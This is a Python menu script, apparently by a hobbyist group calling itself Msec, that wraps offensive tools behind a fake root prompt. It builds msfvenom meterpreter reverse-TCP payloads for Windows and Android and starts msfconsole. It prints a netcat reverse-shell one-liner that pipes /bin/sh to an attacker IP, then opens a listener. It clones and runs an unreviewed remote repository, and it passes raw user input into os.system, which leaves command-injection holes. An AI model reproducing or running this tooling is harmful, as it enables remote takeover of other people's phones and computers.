import sys
import os
import time
import socket
os.system("clear")
print("\033[1;33m")
print(" /$$      /$$                                     /$$$$$$$$                  /$$           ")
print(" | $$$    /$$$                                    |__  $$__/                 | $$          ")
print(" | $$$$  /$$$$  /$$$$$$$  /$$$$$$   /$$$$$$$         | $$  /$$$$$$   /$$$$$$ | $$  /$$$$$$$")
print(" | $$ $$/$$ $$ /$$_____/ /$$__  $$ /$$_____/         | $$ /$$__  $$ /$$__  $$| $$ /$$_____/")
print(" | $$  $$$| $$|  $$$$$$ | $$$$$$$$| $$               | $$| $$  \ $$| $$  \ $$| $$|  $$$$$$ ")
print(" | $$\  $ | $$ \____  $$| $$_____/| $$               | $$| $$  | $$| $$  | $$| $$ \____  $$")
print(" | $$ \/  | $$ /$$$$$$$/|  $$$$$$$|  $$$$$$$         | $$|  $$$$$$/|  $$$$$$/| $$ /$$$$$$$/")
print(" |__/     |__/|_______/  \_______/ \_______/         |__/ \______/  \______/ |__/|_______/ ")
print("Create By  RedSec")
print("Msec Tools")
print("")
while True:
    # Dapatkan pilihan dari pengguna
    pilihan = input("Msec@root~# ")

    # Eksekusi perintah sesuai dengan pilihan
    if pilihan == "ls":
        print("==================")
        print("MyIp ( ip )")
        print("run wireshark ( wr )")
        print("NetCat ( nc )")
        print("Owner ( own )")
        print("tools ( tools )")
        print("exit ( exit )")
        print("clear ( clear )")
        print("SETOOLKIT ( set )")
        print("ifconfig ( if )")
        print("metasploit ( msf )")
        print("msfvenom ( msfvapk & msfvwin)")
        print("Mp4 Download Youtube ( mp4don )")
        print("Module Install ( install )")
        print("whois ( whois )")
        print("nmap ( nmap )")
        print("docker Search ( dcsearch )")
        print("docker pull ( dcpull )")
        print("docker run ( dcrun )")
        print("ML Empas ( mlem )")
        print("==================")
    elif pilihan == "tools":
        print("===================")
        print("[1] MsecML")
        print("[2] MsecBackdoor")
        print("===================")
    elif pilihan == "mlem":
        print("")
        with open('main/ml.txt', 'r') as file:
            for line in file:
                print(line)
                time.sleep(1)
    elif pilihan == "dcrun":
        dc3 = input ("Nama Repo : ")
        os.system(f"docker run -it {dc3}")
    elif pilihan == "dcpull":
        dc2 = input ("Nama Repo : ")
        os.system(f"docker pull {dc2}")
    elif pilihan == "dcsearch":
        print("")
        print("=====================================")
        print("Metasploitable : tleemcjr/metasploitable2")
        print("kali linux : kalilinux/kali-rolling")
        print("Ubuntu : ubuntu")
        print("=====================================")
        print("")
    elif pilihan == "nmap":
        nmap = input ("Masukan IP : ")
        os.system(f"nmap {nmap}")
    elif pilihan == "whois":
        ip1 = input ("Masukan URL/IP : ")
        os.system(f"whois {ip1}")
    elif pilihan == "apt-get install youtube-dl":
        os.system("apt-get install youtube-dl")
    elif pilihan == "install":
        install = input ("Masukan Nama Module : ")
        os.system(f"apt-get install {install}")
    elif pilihan == "mp4don":
        print("")
        don = input ("Masukan Link : ")
        os.system(f"youtube-dl -f mp4 {don}")
    elif pilihan == "msfvwin":
        ip8 = input ("Masukan Local IP : ")
        port2 = input ("Masukan Port : ")
        win = input ("Masukan Nama File ( test.exe ) : ")
        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip8} LPORT={port2} R > {win}")
        os.system("msfconsole")
    elif pilihan == "msfvapk":
        ip6 = input ("Masukan Local IP : ")
        port1 = input ("Masukan Port : ")
        apk = input ("Masukan Nama File ( test.apk ) : ")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip6} LPORT={port1} R > {apk}")
        os.system("msfconsole")
    elif pilihan == "su":
        os.system("sudo su")
    elif pilihan == "apt install git":
        os.system("apt install git")
    elif pilihan == "if":
        print("")
        os.system("ifconfig")
        print("")
    elif pilihan == "msf":
        os.system("msfconsole")
    elif pilihan == "set":
        os.system("sudo setoolkit")
    elif pilihan == "clear":
        print("\033[1;33m")
        os.system("clear")
        print(" /$$      /$$                                     /$$$$$$$$                  /$$           ")
        print(" | $$$    /$$$                                    |__  $$__/                 | $$          ")
        print(" | $$$$  /$$$$  /$$$$$$$  /$$$$$$   /$$$$$$$         | $$  /$$$$$$   /$$$$$$ | $$  /$$$$$$$")
        print(" | $$ $$/$$ $$ /$$_____/ /$$__  $$ /$$_____/         | $$ /$$__  $$ /$$__  $$| $$ /$$_____/")
        print(" | $$  $$$| $$|  $$$$$$ | $$$$$$$$| $$               | $$| $$  \ $$| $$  \ $$| $$|  $$$$$$ ")
        print(" | $$\  $ | $$ \____  $$| $$_____/| $$               | $$| $$  | $$| $$  | $$| $$ \____  $$")
        print(" | $$ \/  | $$ /$$$$$$$/|  $$$$$$$|  $$$$$$$         | $$|  $$$$$$/|  $$$$$$/| $$ /$$$$$$$/")
        print(" |__/     |__/|_______/  \_______/ \_______/         |__/ \______/  \______/ |__/|_______/ ")
        print("Create By  RedSec")
        print("Msec Tools")
        print("")
    elif pilihan == "tools1":
        os.system("git clone https://github.com/MsecTeam/MsecML")
        os.system("python MsecML/ml.py")
        os.system("exit")
    elif pilihan == "ip":
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        print(f'IP address : {ip_address}')
    elif pilihan == "wr":
        os.system("wireshark &")
    elif pilihan == "nc":
        ip = input ("Masukan ip anda : ")
        port = input ("Port yang ingin di dengar : ")
        print (f"SHELL ANDA : rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
        os.system(f"nc -lnvp {port}")
    elif pilihan == "own":
        print("=====================")
        print("Name : ./RedSec")
        print("Old  : 13 In Years")
        print("Country : Indonesia")
        print("Team : Msec ( MedanSec )")
        print("=====================")
    elif pilihan == "exit":
        break
    else:
        print("Menu tidak valid.")
